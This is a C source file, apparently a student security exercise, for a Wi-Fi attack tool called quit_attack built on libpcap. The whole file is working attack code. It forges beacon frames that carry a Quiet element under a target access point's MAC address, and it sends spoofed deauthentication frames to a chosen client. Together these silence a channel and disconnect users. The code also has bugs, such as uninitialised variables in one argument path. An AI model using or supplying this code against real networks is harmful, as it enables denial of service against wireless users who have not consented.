#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAC_ADDR_LEN 6
typedef struct Proberesponse // 44여야함
{
    // Radio 8
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_int present_flag;
    // Probe Response 24
    u_short type;
    u_short dur;
    u_char mac_Des[MAC_ADDR_LEN];
    u_char mac_src[MAC_ADDR_LEN];
    u_char mac_bssid[MAC_ADDR_LEN];
    u_short fs_number;
    // Fixed  parameters 12
    u_int64_t time;
    u_short interval;
    u_short capabilities;

} probe; // 44

typedef struct Deauth
{
    // Radio 8
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_int present_flag;
    // Deauth 24
    u_short type;
    u_short dur;
    u_char mac_Des[MAC_ADDR_LEN];
    u_char mac_src[MAC_ADDR_LEN];
    u_char mac_bssid[MAC_ADDR_LEN];
    u_short fs_number;
    // Fixed  parameters 2
    u_char Reasoncode;
} Dth; // 34;

void usage()
{
    printf("syntax: quit_attack <interface> <AP mac> <STA mac> <Ch> <ssid>\n");
    printf("sample: csa_attack wlan0 11:22:33:44:55:66 aa:bb:cc:dd:ee:ff 13 KITRI_DEV2.4");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{

    if (argc != 4 && argc != 6)
    {
        printf("argc : %d\n", argc);
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6]);
int sendDeauth(unsigned char *Interface, const u_char AP_mac[6], const u_char STA_mac[6]);

int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (!parse(&param, argc, argv))
        return -1;

    unsigned char *Interface = argv[1];
    unsigned char *Input_AP_MAC = argv[2];
    unsigned char *Input_STA_MAC;
    unsigned char *Input_Ssid;
    unsigned char *Input_Type;
    unsigned char *Input_AP_Ch;

    if (argc == 6)
    { // Unicast
        Input_STA_MAC = argv[3];
        Input_AP_Ch = argv[4];
        Input_Ssid = argv[5];
    }

    unsigned char ChangeCh = 100;
    unsigned char ApCh = atoi(Input_AP_Ch);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        u_char *send_packet;
        if (argc == 6)
        { // Unicast
            // Probe 초기화

            probe prb;
            prb.hdr_rev = 0x0;
            prb.hdr_pad = 0x0;
            prb.hdr_len = 0x8;
            prb.present_flag = 0x0;
            prb.type = 0x0080; // Quit
            prb.dur = 0x0;
            Mac_("ff:ff:ff:ff:ff:ff", prb.mac_Des);
            Mac_(Input_AP_MAC, prb.mac_src);
            Mac_(Input_AP_MAC, prb.mac_bssid);

            prb.fs_number = 0x0;
            prb.time = 0x0;
            prb.interval = 0x0064;
            prb.capabilities = 0x1111;
            int ssid_len = strlen(Input_Ssid);
            int send_packet_len = 44 + ssid_len + 2 + (2 + 1) + 6 + 2; // tag : SSid, Ds, Quit
            send_packet = (u_char *)malloc(send_packet_len);

            memcpy(send_packet, &prb, 44);

            int packet_point = 44;

            *(send_packet + packet_point) = 0x0; // ssid num
            packet_point++;
            *(send_packet + packet_point) = ssid_len; // ssid len
            packet_point++;

            for (int i = 0, packet_point_before = packet_point; packet_point < packet_point_before + ssid_len; packet_point++, i++)
            {

                *(send_packet + packet_point) = *(Input_Ssid + i);
            } // ssid data

            *(send_packet + packet_point) = 0x3; // Ds num
            packet_point++;
            *(send_packet + packet_point) = 0x1; // Ds len
            packet_point++;
            *(send_packet + packet_point) = ApCh; // Current Channel
            packet_point++;
            *(send_packet + packet_point) = 0x28; // Quit
            packet_point++;
            *(send_packet + packet_point) = 0x6; // Quit len
            packet_point++;
            *(send_packet + packet_point) = 0x1; // Count
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Period
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Dur
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Dur
            packet_point++;
            *(send_packet + packet_point) = 0x0; // Offset
            packet_point++;
            *(send_packet + packet_point) = 0x0; // Offset

            sendDeauth(Interface, Input_AP_MAC, Input_STA_MAC);
            for (int i = 0; i < 4; i++)
            {
                printf("Quit send!!!\n");
                if (pcap_sendpacket(pcap, send_packet, send_packet_len) != 0)
                {
                    fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                    return -1;
                }
            }

            free(send_packet);
        }
    }

    pcap_close(pcap);
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);

    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

int sendDeauth(unsigned char *Interface, const u_char AP_mac[6], const u_char STA_mac[6])

{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    Dth Deauth;
    Deauth.hdr_rev = 0x0;
    Deauth.hdr_pad = 0x0;
    Deauth.hdr_len = 0x8;
    Deauth.present_flag = 0x0;
    Deauth.type = 0x00c0; // Deauth
    Deauth.dur = 0x0;
    Mac_(STA_mac, Deauth.mac_Des);
    Mac_(AP_mac, Deauth.mac_src);
    Mac_(AP_mac, Deauth.mac_bssid);
    Deauth.fs_number = 0x0;
    Deauth.Reasoncode = 0x0007; // 07 00

    printf("Deauth send!!!\n");
    if (pcap_sendpacket(pcap, (char *)&Deauth, 34) != 0)
    {
        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
    }
    pcap_close(pcap);
}